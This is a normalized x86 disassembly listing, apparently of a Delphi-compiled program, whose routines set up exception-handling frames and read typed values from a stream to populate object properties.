mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_417a65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_417a23
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_4174c0
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417538
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_417620
pop ecx
push ebp
call sub_4177d0
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_417730
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a90
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417538
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_417538
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a9c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403fcc
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404fe4
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403454
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413fa0
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417484
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413de8
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417484
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413de8
sub_417a28
push ebp
call sub_4175a0
pop ecx
test al al
je r-xdata
call sub_403a0c
call sub_403a60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403258
sub_417ab0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417b20
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_417b0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417b20
mov eax [ ebp - 0x4 ]
call sub_417070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4171b4
retn
sub_417b20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416f58
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418028
mov eax [ ebp - 0x4 ]
call sub_417ec4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403454
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_417be2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403454
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416f58
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_417874
mov eax [ ebp - 0x4 ]
call sub_417ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417be9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_417bf0
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_418cfc
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417e78
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_4172c0
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_417c34
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_418cfc
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417e78
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4172c0
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_417c78
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418cfc
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417e78
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4172c0
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_417cc8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418cfc
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417e78
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4172c0
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_417d0c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_418cfc
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_416d98
mov al [ eax + lookup_table_417d33 ]
jmp [ eax * 4 + jump_table_417d41 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4172c0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404098
mov eax esi
call j_sub_404474#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_4172c0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ffc
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ffc
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ffc
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ffc
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_417e0c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_418cfc
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_4172c0
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_4172c0
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4172c0
jmp r-xdata
jmp r-xdata
call sub_416d98
sub_417e78
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41729c
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_417e0c
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_418cfc
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4172c0
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_417ecc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41729c
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_418cfc
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_417e0c
mov [ edi ] eax
sub_417f0c
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417ffd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403fa8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404040
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418004
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40420c
sub_418028
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4181f8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403824#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418b20
xor edx edx
push ebp
push j_sub_403824#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404268
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4044c8
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403498
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410cb8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403498
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410cb8
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4183ac
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_4172ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_4172ac
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410d28
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41800c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181ff
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov edi ebx
jmp r-xdata
sub_4181c0
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a0c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181ff
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
sub_418208
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_413938
mov ebx eax
test ebx ebx
je r-xdata
call sub_416d98
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_410d9c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418250
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41682c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413de8
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418290
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_4182df
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419414
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_411238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182e6
lea eax [ ebp - 0x10 ]
call sub_40ee0c
retn
sub_4182ec
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41839e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41729c
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417d0c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41682c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413de8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418cfc
lea eax [ ebp - 0x4 ]
call sub_4056c4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4112ec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183a5
lea eax [ ebp - 0x8 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
call sub_4056c4
retn
sub_4183ac
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4186a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186ae
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403fcc
lea eax [ ebp - 0x24 ]
call sub_404688
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fcc
retn
jmp [ eax * 4 + jump_table_41843c ]
mov eax [ rw-data ]
call sub_416d80
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d28
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41729c
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41735c
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d9c
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_417d0c
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410c54
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d9c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417bf0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41102c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418b5c
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410f2c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418c18
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410f58
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418a40
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d9c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41729c
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41729c
cmp al 0xd
jne r-xdata
push ebp
call sub_418290
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e78
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4112b0
jmp r-xdata
push ebp
call sub_4182ec
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d28
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e0c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d9c
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_417d0c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418208
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418cfc
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d9c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_417d0c
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418cfc
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411278
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418cfc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d28
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4173b4
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411278
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_417d0c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418250
pop ecx
jmp r-xdata
sub_4186b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403ffc
jmp r-xdata
mov eax [ ebx ]
call sub_413ad0
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408db8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418714
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418a2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418afc
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418a0d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4189ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418b20
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418b20
mov eax [ ebp - 0x1c ]
call sub_4136a4
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418b20
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_418b20
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_4186b4
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418b20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031a0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4133f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_418973
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405df4
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413de8
xor eax eax
push ebp
push sub_418953
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413fa0
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41895a
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403258
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_413f44
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_4189a4
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
